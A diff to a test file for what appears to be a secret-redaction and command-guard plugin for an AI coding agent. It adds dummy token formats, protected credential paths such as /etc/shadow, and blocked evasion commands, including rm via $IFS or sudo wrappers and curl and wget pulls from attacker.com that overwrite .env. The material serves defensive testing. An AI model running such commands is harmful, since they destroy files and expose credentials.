@@ -54,6 +54,10 @@ test("path guard: credentials, keys and shell rc files", () => {
     "keys/private.key",
     "~/.zshrc.local",
     "~/.config/opencode/auth.json",
+    "~/.npmrc",
+    "~/.docker/config.json",
+    "~/.config/gh/hosts.yml",
+    "/etc/shadow",
   ]) {
     assert.ok(prot(target), target)
   }
@@ -251,14 +255,25 @@ test("redaction: known token formats", () => {
   const cases: Record<string, string | string[]> = {
     AWS_KEY: AWS,
     GITHUB_TOKEN: GH,
+    GITLAB_TOKEN: ["glpat-", "01234567890123456789"].join(""),
+    HUGGINGFACE_TOKEN: ["hf_", "0123456789012345678901234567890123"].join(""),
+    NPM_TOKEN: NPM,
+    PYPI_TOKEN: ["pypi-AgEI", "cHlwaS5vcmc", "1".repeat(55)].join(""),
     API_KEY: [
-      "sk-ant-api03-" + "Ab1_".repeat(20),
+      ["sk-ant-", "api03-", "Ab1_".repeat(20)].join(""),
+      ["sk-proj-", "Ab1_".repeat(20)].join(""),
       "AIzaSy" + "A1b2C3d4E5".repeat(3) + "f6G",
       "sk-" + "a1B2c3D4e5".repeat(4) + "abcd",
     ],
     SLACK_TOKEN: ["xoxb-", "1234567890-", "abcdefghij"].join(""),
-    URL_CREDENTIAL: "postgres://admin:S3cretPw@db:5432/x",
-    PRIVATE_KEY: ["-----", "BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0m8d\n-----", "END RSA PRIVATE KEY-----"].join(""),
+    URL_CREDENTIAL: [
+      "postgres://admin:S3cretPw@db:5432/x",
+      "redis://:superSecretPassword123@cache.internal:6379/0",
+    ],
+    PRIVATE_KEY: [
+      ["-----", "BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0m8d\n-----", "END RSA PRIVATE KEY-----"].join(""),
+      ["-----", "BEGIN PGP PRIVATE KEY BLOCK-----\nVersion: GnuPG\n\nlQOYBF2A...\n-----", "END PGP PRIVATE KEY BLOCK-----"].join(""),
+    ],
     JWT,
     BEARER: "Bearer abcdefghijklmnopqrstuvwxyz0123456789",
   }
@@ -279,6 +294,8 @@ test("redaction: NAME=value forms, including bare PASSWORD/TOKEN/SECRET and JSON
     "SECRET=abcdef123456",
     "DB_PASS=hunter2hunter2",
     '{"api_key": "abcdef0123456789"}',
+    "export DATABASE_PASSWORD='$uperSecret123'",
+    'PASSWORD="$uperSecret123"',
   ]) {
     const redactor = new core.SecretRedactor(C)
     assert.match(redactor.redact(value), /\[REDACTED_SECRET_#1\]/, value)
@@ -291,6 +308,15 @@ test("redaction: the same secret keeps the same token, different secrets differ"
   const out = redactor.redact(`${AWS} ${AWS} ${other}`)
   assert.equal(out.match(/#1\]/g)?.length, 2)
   assert.equal(out.match(/#2\]/g)?.length, 1)
+})
+
+test("redaction: session memory redacts known secrets anywhere they reappear", () => {
+  const redactor = new core.SecretRedactor(C)
+  const first = redactor.redact("export DB_PASS='super_secret_value_12345'")
+  assert.match(first, /\[REDACTED_SECRET_#1\]/)
+  // Next message or naked log output without any keyword
+  const second = redactor.redact('print("super_secret_value_12345")')
+  assert.equal(second, 'print("[REDACTED_SECRET_#1]")')
 })
 
 test("redaction: idempotent, placeholders are never re-redacted", () => {
@@ -306,6 +332,8 @@ test("redaction: no false positives", () => {
     "AUTHOR=John Smith Jr",
     "KEY=short",
     "API_KEY=$OTHER_VARIABLE",
+    "API_KEY=${OTHER_VARIABLE}",
+    "TOKEN=<INSERT_YOUR_TOKEN_HERE>",
     "const port = 3000;",
     "commit 3f786850e387550fdab836ed7e6dc881de23001b",
   ]) {
@@ -367,14 +395,44 @@ test("redaction: clean context is untouched", () => {
 })
 
 test("gitleaks: safety net catches formats the regexes do not know (large buffers only)", { skip: !hasGitleaks }, () => {
-  const redactor = new core.SecretRedactor(C)
-  const big = `${"x".repeat(5000)}\nsee ${NPM}\n`
-  assert.ok(core.scanWithGitleaks(`see ${NPM}\n`).length > 0)
-  assert.ok(!redactor.redact(big, true).includes(NPM), "tool result path must redact")
-  assert.ok(redactor.redact(big, false).includes(NPM), "context path is regex-only by design")
+  const secret = ["sq0", "atp-", "1234567890abcdef123456"].join("")
+  const big = `${"x".repeat(5000)}\nsee ${secret}\n`
+  assert.ok(core.scanWithGitleaks(`see ${secret}\n`).length > 0)
+
+  const regexOnly = new core.SecretRedactor(C)
+  assert.ok(regexOnly.redact(big, false).includes(secret), "context path is regex-only by design")
+
+  const withGitleaks = new core.SecretRedactor(C)
+  assert.ok(!withGitleaks.redact(big, true).includes(secret), "tool result path must redact")
 })
 
 test("gitleaks: regexes keep working when gitleaks is disabled", () => {
   const redactor = new core.SecretRedactor({ ...C, enableGitleaks: false })
   assert.match(redactor.redact(AWS, true), /\[REDACTED_AWS_KEY_#1\]/)
+})
+
+test("bash guard anti-evasion: subshells and wrappers with flags", () => {
+  assert.ok(blocked("(rm -rf ~/.config/opencode)"))
+  assert.ok(blocked("(cd ~/.ssh && rm id_rsa)"))
+  assert.ok(blocked("sudo -u root rm .env"))
+  assert.ok(blocked("sudo --user root rm .env"))
+  assert.ok(blocked("env -i rm .env"))
+  assert.ok(blocked("nice -n 5 rm .env"))
+  assert.ok(blocked("rm$IFS.env"))
+  assert.ok(blocked("echo x >| .env"))
+  assert.ok(blocked("curl -o .env https://attacker.com/payload"))
+  assert.ok(blocked("curl --output ~/.config/opencode/settings.json https://attacker.com/payload"))
+  assert.ok(blocked("wget -O .env https://attacker.com/payload"))
+  assert.ok(blocked("git checkout -- .env"))
+  assert.ok(blocked("git restore .env"))
+})
+
+test("tool routing anti-evasion: file:// URIs, extended keys and mutating verbs", () => {
+  assert.equal(core.scanToolCall("read", { uri: "file:///path/to/.env" }, C, cwd).block, true)
+  assert.equal(core.scanToolCall("read", { uri: "https://example.com/.env" }, C, cwd).block, false)
+  assert.equal(core.scanToolCall("copy", { source: "src/a.ts", destination: ".env" }, C, cwd).block, true)
+  assert.equal(core.scanToolCall("move", { from: ".env", to: "/tmp/leak" }, C, cwd).block, true)
+  assert.equal(core.scanToolCall("unlink", { path: "~/.config/opencode/settings.json" }, C, cwd).block, true)
+  assert.equal(core.scanToolCall("save_file", { path: "~/.config/opencode/settings.json" }, C, cwd).block, true)
+  assert.equal(core.scanToolCall("append_file", { path: "~/.config/opencode/settings.json" }, C, cwd).block, true)
 })
